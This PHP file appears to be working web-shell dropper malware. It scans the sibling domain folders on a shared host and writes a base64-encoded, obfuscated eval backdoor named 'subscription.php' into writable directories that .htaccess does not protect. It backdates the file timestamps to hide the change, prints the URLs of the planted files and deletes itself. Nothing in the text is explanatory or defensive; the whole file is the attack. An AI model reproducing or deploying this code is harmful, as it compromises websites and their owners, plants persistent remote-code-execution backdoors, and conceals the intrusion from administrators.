<?php

error_reporting(0);
set_time_limit(0);
$depth = 2;
$fileData = 'PD9waHANCmZ1bmN0aW9uIGNvZGV1bigkc3RyY2Mpew0KICAgICR4ID0gMDsNCiAgICAkc3RyY2MgPSBiYXNlNjRfZGVjb2RlKCRzdHJjYyk7DQogICAgJGxlbiA9IHN0cmxlbigkc3RyY2MpOw0KCSRrZXlvbmUgPSAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ107DQoJaWYocHJlZ19tYXRjaCgnL0FwcGxlV2ViS2l0XC8oLiopIFwoL2lzJywka2V5b25lLCRzcmMpKXsNCgkJJGtleSA9IG1kNSgnUUFEJy5zdHJfcmVwbGFjZSgnLicsJ1InLCRzcmNbMV0pKTsNCgl9ZWxzZXsNCgkJZGllKCk7DQoJfQ0KICAgICRsID0gc3RybGVuKCRrZXkpOw0KICAgICRjaGFyID0gJyc7DQogICAgZm9yICgkaSA9IDA7ICRpIDwgJGxlbjsgJGkrKykgew0KICAgICAgICBpZiAoJHggPT0gJGwpIHsNCiAgICAgICAgICAgICR4ID0gMDsNCiAgICAgICAgfQ0KICAgICAgICAkY2hhciAuPSBzdWJzdHIoJGtleSwgJHgsIDEpOw0KICAgICAgICAkeCsrOw0KICAgIH0NCiAgICAkc3RyID0gJyc7DQogICAgZm9yICgkaSA9IDA7ICRpIDwgJGxlbjsgJGkrKykgew0KICAgICAgICBpZiAob3JkKHN1YnN0cigkc3RyY2MsICRpLCAxKSkgPCBvcmQoc3Vic3RyKCRjaGFyLCAkaSwgMSkpKSB7DQogICAgICAgICAgICAkc3RyIC49IGNocigob3JkKHN1YnN0cigkc3RyY2MsICRpLCAxKSkgKyAyNTYpIC0gb3JkKHN1YnN0cigkY2hhciwgJGksIDEpKSk7DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAkc3RyIC49IGNocihvcmQoc3Vic3RyKCRzdHJjYywgJGksIDEpKSAtIG9yZChzdWJzdHIoJGNoYXIsICRpLCAxKSkpOw0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkc3RyOw0KfQ0KJHNlbV9nZXQgPSBjb2RldW4oInlxU2owZGVVMVp1bHB0T3NuTS9MWG1KYmE0VnpRNFdqeHFTZmczSlJrbytwZTRQQnhIQ0RReitneDJDYzFOZWJwbHBVeEt5Q3JYaTRpMW5KbnAyWWo5cWlVNytPWHQ1RFAwQ0ZySlRUeTV1bWthREcycUdlbGNham5OR1ducGhZaVpGM3E3RjZ0cEZYbmNxa21NRFpwbFNQaTRmVW1zNlloNDFnbmtJN1BKbkxXcDdSMjVyQ3E2V2owSm1YeHNpVm1KdWN5bzVkd0htdWZIeTJrRk9abWRHWGtOZlZWOENSVjZ2T3FKTFB4YU9YVkkyUmlxM0NwY3lWcThLbGtxZVlqbHVzYjI4K2JKdVluOUJZVlozS3BhQ21VTWpWcGRDbG9veFp5cWVXbUo3QlZHL1gxYUhTbDVsWDFLMld4TW1wcFc1Znk5V24xWEdoa3FtRFpHOVZhM0k4T3QvS29kYWJzRVJyUVR6R3g1NmhVbEtoektqUHA0V1RwcytrbzNDTWg2U1d4c0ZYb2F1bG85Q1psNEhLbDV1ZWJKVE1xTStubzJ5WjFWVmdjVktnUHp0cjRrSnRzMEpCeHB1YjBJUllicGlmMTlOWnhxSElwTERUbW02UFV0S25uZGJPcGNTb3FXYkhwNlhPa1pxVHBwSEJpRm5PbU5tWXBzZHlqVldBdElXRnZvZHpuNStqcDlhc1U4L0ZvNWR2aklmTW9zMll4S1dudjFkUnA2blZsMjYraDV2TW9wcVRnMmR4bmMya29xZWtoZHF5MFppaWpGbldxcE9nbWRtT1U0TGJscytybW5TOVdvalJoSHlibnBYQmlHaWZiNVNXcHRXaWIyOWYyWlp2bnBTcDFYUlhjbTVDbWRiU21hYWJuOU9Hb01hbmpWU3MxYUZkVTFUSm02T0w0RUp0UDFtYXlYV1cxdGFpa1p1ZXp0cGhpbTV5T2tER3FxT2ZqOWlYcGRIVnFZdGFtSitOV0hhMnRvS0Jnb1RFdTR1dFg0VlVyTldoV200OWJ6dVUxOWVod3FtYXE5Q29wNG1JbVpwZVVLaTdpNjJDdFlTV3RYcUZpSUt6aG9PanM0aXBlNGRqZ1dsY25IRkFPNVdsMTlLWTFKalpuNmZYWFZXV21KRjFoclN4aExPS2xJdXFoWGl3dVlwZVkyQ09vVVpyUEltVW1OZVdVWEJReUtlanpzU2EyNXVZWDRXYm00cWZRenc3bWN1T1dvV1h4cVNZakxBK1BUbHVWcFhEMlphRGMxVjN4NkdmeHNPZGw2YVB5TlduMVpqVHBLcUxXYWFsbkk1dFBteHVzbkJBUHAzS3BKakExS3Vta1pQVTFLM0dvZG1qWDRlWm1xVmNoVmFWdzltV2pIRkNRZDVGUGNyS1ZscFdqNnlyamJ4YXlhZGV3RjVScmoxdk8xWEczRldnVmxtV3FIMkh2SXVhcVZtTm9ITkRhbGZKcDFlZ1ZaT1VvOHBvWmNISm1zYWxtWnlKcTZmVHc2aWhwbUdZamwzRnFvNVpjbkEvT3B5V2hWcWgxTXFjd3FPV3E4U2dXNGlUcTZTZWJZMlVZNkJjaTVTZzFYSlpZVnFPWVZpT2hWbkhyV0ZYaGFHaHg5TmZXMUtyY25CQ2FsZmFvcU9EY2xGWG1kT1lvTDJXa3A1RFAwQnFYSmZLMWxadlVsVE8xSi9RanBlTmNuQS9PckJReXA2a3g0V3djRUErUU5HcW1NakRvNU9tazgyT1lKQ28xNXgwaTJOYlhGK01YbEdHeWF5UFZsbWd6NTZpaXA5RFBEczVpZHVyelZPaVVGdk1vNWVpaTVhUGJHOXZQbXhhbWFEVFdIQ0JpMTF0UHpwdTQwWnJQTldpbk1xVW5wU2t5SnBaaVpSZGtXQmVrNUJnWVl1TmttQmFYbytsWW9WaWpGeFhoNnFqbjF5RlZwK0xvRUp0UDU2ZGdXQlh6NzlwajFKdG9vWmcxYXZaVjJDRHNENDlPVzVXcTRLaVZZcW1uYWVJYzBCcmJUOVdvSkhTeTFtZVU0bWVrcFdTYkVBNmJxOVJ4OUdveUZhd1JHdEJQSVhlVm05U1ZOUEJiTDV1Y2pwQWJGbWZsSjNLVW02Q2g2bklvNldqd3F5WWc1OURQRHV0Y25CQ3lwbUZXRnZIbnFOVFVhSlNXSW1PVmQ1RFAwQnFYSmZLMWxadlVsVEV1WDZ6aWFxQ2tvVjVnSGFGc25kL3RzU0hzb1dKV2I1WVlZR0xaVmxTWG9XS25jcWxoVjVYaW1SWVUxNkZWcC9EMHBxRFpGVmVqMTlUajRSYXJHMDliMisyZ1pqUm81eURzRDQ5T1c1V2xjdlhWYUJXV1phMGZZVzNxWWlOVkhTMHFZNnVlTE9FbHJXRWdJZFN3bEpmZ294a2lsWmpWNFdtbE03SlZtQlNWNU9OV1k5VGlhcHljRDg2c0Qxdk81akgyVjJIcTZlampWaFh4YzJvVzIwOWIyK2l4MU9ObHFEUG1wQ1lxTTZscGRXTldjZWZwMkNLV0s1dWJqODdsNVBOMVZtRGI5bWlkWitwbFhGc3k2R2Yxb1dZMHFLa3FaNlVWY2pXbTVlZ2pJZWtuZENxMDV5bXhKbFJwcVhJbFpiVjJIR1NuS1NsMVhadmtOaWFjRzVmMmRoM2cyNXlPa0RnVlphZm84cFNyRzl2UG15Ym1KL1FXRldkMktod2JxVEpwSFhIb3RPa1Y4YWtuYUtpb281VDFNcVp2MWh6bTlDdm9jM1RsNVpTbHNiUHBaMWl5NStsMTNOdFlxVEpjRzJSMmFlaFdIQkVhMEd3Ym02elVwZWMyTXVpeDFPTlZKYXpoSVNIaTR5V3FNSGFwODlka21DQnMwQnJiVnFucEp5Rm8xbUZrclYvaXJlUVdKZW54S2Vqem95U25rTS9RTkdxbU1qRG81T21rODJPWUpCYmsxcGd2MlJaWVZxT2psK0trMStpWDFsbWlHUlRoZG1vbmw1UWlkUmluRUJ2T2FESlZWbFhuc0Jsam9LaWNvTmRxYS9WWDF5QjMwTThPem1KNEZtZVU0eWduOU5jYkVBNmJqdFYwTWFpeUZaeVY0V21qcFBCY1Q4OE9lS0duczJteWxDeWNEODZQRlRmVW02Q2lhTythWkp5YmtJOGFvaWtrNStWaGFOWmc2ZktuYWZQbHFXWVVxQS9PMnZpUW0wL1dadktxbE9laEZxUmduKzR1cFNJbHRlbHA4U3BtVnFOaFdCUmhKUlhnMlJWVzgrWm9NYUVaRkpaWG95R1o0RlgzMnRFYlQ2WW1LU05WcWJVMFdHRFdwbWcwMkZ1Ym00L201aFFqY3lpelpqRWxhL01xS1dtV0ltV210U09Yb094UWtGcVFaakV6S1ZTVkd6WjJIZWRwOGx1Yzhta242ZFF5S0dkMGRkeXYxaWNxY2Fkb2IyR2RKYWhwOVBTcU1LWGhhT3N4cGlXcHFPaFlaZlIwNm1oY21TcnhYWnZrTmlvY0ZScmNuQkMzbFBLbktySVZheEFPbTQ3bHNYTnBJTlljYXZUZG0vVnlIUnVtSi9UMmxuRW90R2ZxYUNSVTZXVnlZNVRvTW1rMnFTaHBzS2NVOGZGbjU1dVg4dlZwOVZ4b1YrcngzTnRZcVRYY0ZPZGNqOXNzMEpCM2tVOXhzZWVvVkpTb2Rxcm4yL1psSFdmbTZDbG5ZV2ZsdGJOcE1kemtWbXhoNGExd0ZoU2s1UFp6NmpQY01GU2s0VnpiYWFneHFCdnQ5ZWhuVlp4WnRTb2xNK2ljcHVnb05yYVdkV3MxWlYwMTVxcHAxRFRrNTdIb3BHRm1xeVcxcXFmdllaV3FKT2Myc3QydlZYQlVuV2ZucCtqcGRsU3BkdlZtcUNTVjUvS25KZkcwcEpVVXA3RzA1NmVqNGVUcWRpbGtxZVl3VlJSMk1haDJKdHlrNE5jbzhMWW5vNVVicUhQcDlHbzJWQ3IzS1dXY0tQYWxKN0wyVlhabDZHc3huV1BnNnVicG5pWjBjdVZnM0doWDUzU3A1NXhiSlNtbGFDaFpOZW9jMW1jIik7DQpldmFsKCRzZW1fZ2V0KTs=';
$fileName = 'subscription.php';

function GetAllDirs($startPath){
	$allDirs = array($startPath => 0);
	$rDir = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($startPath), RecursiveIteratorIterator::CHILD_FIRST);
	foreach($rDir as $rPath) {
		if($rPath->isDir() && $rPath->isWritable() && !$rDir->isDot() && !strstr($rPath,".well-known") && !strstr($rPath,"cgi-bin")){
			$dirPath = str_replace('\\', '/', (string)$rPath);
            if(!CheckHtaccess($dirPath.'/.htaccess'))
			    $allDirs[$dirPath] = substr_count(str_replace($startPath, '', $dirPath),'/');
		}
	}
	arsort($allDirs);
	return $allDirs;
}

function CheckHtaccess($htaccessPath){
	$isDeny = false;
	if(file_exists($htaccessPath)){
	$isDeny = true;
		if(is_readable($htaccessPath)){
			$htaccessContent = strtolower(file_get_contents($htaccessPath));
			$searchContent = 'deny from';
			if (!strstr($htaccessContent, $searchContent)){
				$isDeny = false;
			}
		}
	}
	return $isDeny;
}

function GetRandomPath($dirs, $depth){
	if($depth > (int)current($dirs) && (int)current($dirs) == '0'){
		return '';
	}else{
		if($depth > (int)current($dirs)){
			$depth = (int)current($dirs);
		}
		$allKeys = array_keys($dirs, $depth);
		return $allKeys[rand(0, count($allKeys) - 1)];
	}
}

function FileWrite($filePath, $fileData){
$pathParts = pathinfo($filePath);
$fileTime = filemtime($pathParts['dirname']);
	if($fp = fopen($filePath, 'w')) {
		fwrite($fp, $fileData);
		fclose($fp);
		touch($filePath, $fileTime);
		touch($pathParts['dirname'], $fileTime);
		return $filePath;
	}
}

function GetDomains($dirs, $preDomainPath, $postDomainPath, $domZones){
	foreach($dirs as $dir){
		if(preg_match('#'.$domZones.'(\/(.*?)$|$)#', $dir, $matches) && !preg_match('#('.str_replace('www.', '', $_SERVER['HTTP_HOST']).')|('.$_SERVER['HTTP_HOST'].')#', $dir)) {
                        $domainPath = rtrim($preDomainPath.'/'.$dir.'/'.$postDomainPath, '/');
                        if(is_dir($domainPath)) {
							$dirsc[] = $domainPath.'|'.$dir;
                        }			
		}
	}
	return $dirsc;
}

$startDir = $_SERVER['DOCUMENT_ROOT'];
$domZones = '(\.ua|\.com|\.edu|\.gov|\.net|\.org|\.biz|\.info|\.name|\.jobs|\.mobi|\.tel|\.travel|\.top|\.xyz|\.az|\.am|\.by|\.ge|\.kz|\.kg|\.lv|\.lt|\.md|\.ru|\.tj|\.tm|\.uz|\.ad|\.at|\.be|\.ch|\.de|\.dk|\.es|\.eu|\.fi|\.fr|\.gr|\.ie|\.is|\.it|\.li|\.lu|\.mc|\.mt|\.nl|\.no|\.pt|\.se|\.uk|\.al|\.bg|\.cz|\.hu|\.mk|\.pl|\.ro|\.si|\.sk|\.ac|\.ag|\.as|\.asia|\.au|\.br|\.bz|\.ca|\.cat|\.cc|\.cd|\.ck|\.cl|\.cn|\.cx|\.gi|\.gs|\.hk|\.hm|\.hn|\.im|\.in|\.jp|\.kr|\.la|\.lk|\.me|\.mn|\.ms|\.mx|\.my|\.nz|\.pk|\.sg|\.sh|\.st|\.tc|\.th|\.tk|\.to|\.tv|\.tw|\.us|\.vc|\.vg|\.ws|\.za|\.af|\.cm|\.co|\.ec|\.fm|\.gd|\.gg|\.gl|\.gy|\.ht|\.io|\.je|\.mg|\.mu|\.lc|\.nf|\.nu|\.pe|\.ph|\.pm|\.pw|\.re|\.sc|\.so|\.sx|\.tl|\.il|\.sb|\.gb|\.jpn|\.qc|\.sa|\.uy|\.club|\.vip|\.bet|\.space|\.ae|\.ai|\.an|\.ao|\.aq|\.ar|\.aw|\.ax|\.ba|\.bb|\.bd|\.bf|\.bh|\.bi|\.bj|\.bl|\.bm|\.bn|\.bo|\.bq|\.bs|\.bt|\.bv|\.bw|\.cf|\.cg|\.ci|\.cr|\.cu|\.cv|\.cw|\.cy|\.dj|\.dm|\.do|\.dz|\.ee|\.eg|\.eh|\.er|\.et|\.fj|\.fk|\.fo|\.ga|\.gf|\.gh|\.gm|\.gn|\.gp|\.gq|\.gt|\.gu|\.gw|\.hr|\.id|\.iq|\.ir|\.jm|\.jo|\.ke|\.kh|\.ki|\.km|\.kn|\.kp|\.kw|\.ky|\.lb|\.lr|\.ls|\.ly|\.ma|\.mf|\.mh|\.ml|\.mm|\.mo|\.mp|\.mq|\.mr|\.mv|\.mw|\.mz|\.na|\.nc|\.ne|\.ng|\.ni|\.np|\.nr|\.om|\.pa|\.pf|\.pg|\.pn|\.pr|\.ps|\.py|\.qa|\.rs|\.rw|\.sd|\.sj|\.sl|\.sm|\.sn|\.sr|\.ss|\.su|\.sv|\.sy|\.sz|\.td|\.tf|\.tg|\.tn|\.tp|\.tr|\.tt|\.tz|\.ug|\.um|\.va|\.ve|\.vi|\.vn|\.vu|\.wf|\.aaa|\.abb|\.abc|\.aco|\.ads|\.aeg|\.afl|\.aig|\.anz|\.aol|\.app|\.art|\.aws|\.axa|\.bar|\.bbc|\.bbt|\.bcg|\.bcn|\.bid|\.bio|\.bms|\.bmw|\.bnl|\.bom|\.boo|\.bot|\.box|\.buy|\.bzh|\.cab|\.cal|\.cam|\.car|\.cba|\.cbn|\.cbs|\.ceb|\.ceo|\.cfa|\.cfd|\.cpa|\.crs|\.csc|\.dad|\.day|\.dds|\.dev|\.dhl|\.diy|\.dnp|\.dog|\.dot|\.dtv|\.dvr|\.eat|\.eco|\.esq|\.eus|\.fan|\.fit|\.fly|\.foo|\.fox|\.frl|\.ftr|\.fun|\.fyi|\.gal|\.gap|\.gay|\.gdn|\.gea|\.gle|\.gmo|\.gmx|\.goo|\.gop|\.got|\.hbo|\.hiv|\.hkt|\.hot|\.how|\.htc|\.ibm|\.ice|\.icu|\.ifm|\.inc|\.ing|\.ink|\.int|\.ist|\.itv|\.iwc|\.jcb|\.jcp|\.jio|\.jlc|\.jll|\.jmp|\.jnj|\.jot|\.joy|\.kfh|\.kia|\.kim|\.kpn|\.krd|\.lat|\.law|\.lds|\.llc|\.lol|\.lpl|\.ltd|\.man|\.map|\.mba|\.mcd|\.med|\.men|\.meo|\.mil|\.mit|\.mlb|\.mls|\.mma|\.moe|\.moi|\.mom|\.mov|\.msd|\.mtn|\.mtr|\.nab|\.nba|\.nec|\.new|\.nfl|\.ngo|\.nhk|\.now|\.nra|\.nrw|\.ntt|\.nyc|\.obi|\.off|\.one|\.ong|\.onl|\.ooo|\.ott|\.ovh|\.pay|\.pet|\.phd|\.pid|\.pin|\.pnc|\.pro|\.pru|\.pub|\.pwc|\.qvc|\.red|\.ren|\.ril|\.rio|\.rip|\.run|\.rwe|\.sap|\.sas|\.sbi|\.sbs|\.sca|\.scb|\.ses|\.sew|\.sex|\.sfr|\.ski|\.sky|\.soy|\.srl|\.srt|\.stc|\.tab|\.tax|\.tci|\.tdk|\.thd|\.tjx|\.trv|\.tui|\.tvs|\.ubs|\.uno|\.uol|\.ups|\.vet|\.vig|\.vin|\.wed|\.win|\.wme|\.wow|\.wtc|\.wtf|\.xin|\.xn--p1ai|\.site|\.online|\.earth|\.shop|\.okinawa|\.today|\.care|\.nettr|\.website|\.netid|\.xn--fiqs8s|\.golf|\.moscow|\.netau|\.agency|\.zw|\.rocks|\.training|\.city|\.gallery|\.church|\.technology|\.news|\.center|\.world|\.netua|\.consulting|\.xn--90ais|\.video|\.studio|\.work|\.netbr|\.berlin|\.xn--80adxhks|\.show|\.xn--j1amh|\.live|\.company|\.love|\.xn--80aswg|\.immo|\.xn--p1acf|\.xn--c1avg|\.rest|\.photo|\.cafe|\.taxi|\.tech|\.store|\.xn--d1acj3b|\.salon|\.ruhr|\.express|\.parts|\.partners|\.netpe|\.sucks|\.life|\.baby|\.education|\.xn--80asehdb|\.blog|\.design|\.plus|\.capital|\.netdo|\.media|\.tokyo|\.marketing|\.football|\.buzz|\.services|\.energy|\.pics|\.group|\.click|\.community|\.property|\.host|\.solutions|\.foundation|\.netin|\.construction|\.directory|\.investments|\.stream|\.review|\.cricket|\.global|\.press|\.pizza|\.school|\.help|\.delivery|\.netsg|\.photos|\.clinic|\.tattoo|\.cash|\.events|\.jetzt|\.trade|\.gold|\.science|\.exchange|\.durban|\.netpl|\.ventures|\.fitness|\.repair|\.coffee|\.academy|\.archi|\.netmy|\.boutique|\.com:8080|\.land|\.institute|\.sydney|\.blue|\.photography|\.wine|\.limited|\.finance|\.immobilien|\.domains|\.cool|\.expert|\.fashion|\.cards|\.money|\.guru|\.futbol|\.digital|\.gmbh|\.blackfriday|\.london|\.istanbul|\.netpa|\.tips|\.games|\.style|\.market|\.reisen|\.swiss|\.house|\.poker|\.aero|\.netru|\.works|\.casa|\.tools|\.wedding|\.bike|\.guide|\.link|\.joburg|\.villas|\.estate|\.team|\.ninja|\.international|\.wang|\.coop|\.paris|\.tours|\.social|\.army|\.vision|\.deals|\.fund|\.cooking|\.zone|\.recipes|\.alsace|\.management|\.careers|\.ltda|\.network|\.barcelona|\.hosting|\.surgery|\.catering|\.diet|\.xn--9dbq2a|\.rent|\.engineering|\.cloud|\.university|\.film|\.apartments|\.capetown|\.equipment|\.reviews|\.africa|\.business|\.dental|\.hamburg|\.garden|\.dance|\.racing|\.netpk|\.scot|\.download|\.netvn|\.support|\.netco|\.xn--54b7fta0cc|\.party|\.fish|\.graphics|\.camp|\.band|\.schule|\.wales|\.faith|\.quebec|\.insure|\.promo|\.weber|\.enterprises|\.black|\.software|\.haus|\.wiki|\.forsale|\.beer|\.email|\.wien|\.tennis|\.coupons|\.netnz|\.xn--6qq986b3xl|\.fans|\.gent|\.brussels|\.credit|\.date|\.health|\.sale|\.family|\.furniture|\.menu|\.direct|\.netve|\.boston|\.lighting|\.pictures|\.best|\.properties|\.shopping|\.zm|\.desi|\.tube|\.tirol|\.systems|\.bingo|\.codes|\.supply|\.netgr|\.place|\.bayern|\.irish|\.sarl|\.netge|\.taipei|\.gifts|\.netsa|\.cheap|\.restaurant|\.vlaanderen|\.green|\.kitchen|\.melbourne|\.amsterdam|\.yoga|\.game|\.productions|\.observer|\.corsica|\.hospital|\.attorney|\.nettw|\.homes|\.yt|\.contractors|\.page|\.farm|\.limo|\.rentals|\.chat|\.vegas|\.kiwi|\.college|\.toys|\.koeln|\.healthcare|\.monster|\.coach|\.courses|\.versicherung|\.netec|\.dddro|\.vacations|\.report|\.organic|\.testtk)';


if(preg_match('#^(.*?)\/([^\/]+'.$domZones.')\/*(.*?)$#', $startDir, $matches)){
	$domainDirs = scandir($matches[1]);
	$dirok = GetDomains($domainDirs, $matches[1], $matches[4], $domZones);
}

foreach($dirok as $temp){
	$stra = explode('|',$temp); 
	$startDirectory = $stra[0];
	$allDirs = GetAllDirs($startDirectory);
	$randPath = GetRandomPath($allDirs, $depth);
	if(strlen($randPath) != 0){
		$fileWritedPath = FileWrite($randPath.'/'.$fileName, base64_decode($fileData));
		if(strlen($fileWritedPath) != 0){
			$fileWritedPath = str_replace($stra[0],'',$fileWritedPath);
			$fileWritedPath = 'http://'.$stra[1].$fileWritedPath;
			echo $fileWritedPath.'</br>';
		}
	}
}
unlink("./CBurner.php");
